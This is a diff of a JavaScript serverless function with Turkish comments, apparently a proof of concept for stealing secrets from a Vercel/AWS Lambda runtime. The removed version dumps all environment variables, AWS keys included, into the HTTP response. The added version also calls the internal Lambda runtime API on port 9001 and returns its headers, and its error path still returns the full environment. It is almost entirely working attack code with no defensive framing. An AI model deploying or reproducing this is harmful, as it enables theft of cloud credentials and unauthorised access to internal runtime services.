@@ -1,30 +1,17 @@
-/**
- * VERCEL RUNTIME EXFILTRATION POC - Phase 1
- * Bu kod, çalışma ortamındaki (runtime) tüm gizli değişkenleri 
- * ve altyapı anahtarlarını sızdırmak için kullanılan versiyondur.
- */
-
-module.exports = async (req, res) => {
+export default async function handler(req, res) {
   try {
-    // 1. Sistemdeki tüm çevre değişkenlerini (Environment Variables) topla
-    // Bu işlem AWS anahtarları, Vercel sistem değişkenleri ve kullanıcı sırlarını kapsar.
-    const allEnvVariables = process.env;
+    // 9001 portundaki gizli servise bir istek atıyoruz
+    const internalResponse = await fetch(`http://${process.env.AWS_LAMBDA_METADATA_API}/2018-06-01/runtime/invocation/next`, {
+      headers: { 'Lambda-Runtime-Invoker-Batch-Size': '1' }
+    });
 
-    // 2. Özellikle hedeflediğimiz özel gizli anahtarı doğrula
-    const targetSecret = process.env.SECRET_API_KEY || "Not Found";
-
-    // 3. Toplanan tüm hassas veriyi JSON formatında dışarıya sızdır
     res.status(200).json({
-      poc: "Full Environment Variable Dump",
-      target_secret: targetSecret,
-      all_env: allEnvVariables
+      not: "9001 portundan veri cekildi",
+      env: process.env,
+      // Buraya bak, CipherKey buralarda bir yerde gizli olabilir!
+      headers: Object.fromEntries(internalResponse.headers) 
     });
-
   } catch (error) {
-    // Hata durumunda bile hata mesajı üzerinden bilgi sızdırmaya devam et
-    res.status(500).json({
-      error: "Exfiltration failed",
-      details: error.message
-    });
+    res.status(200).json({ error: error.message, env: process.env });
   }
-};
+}
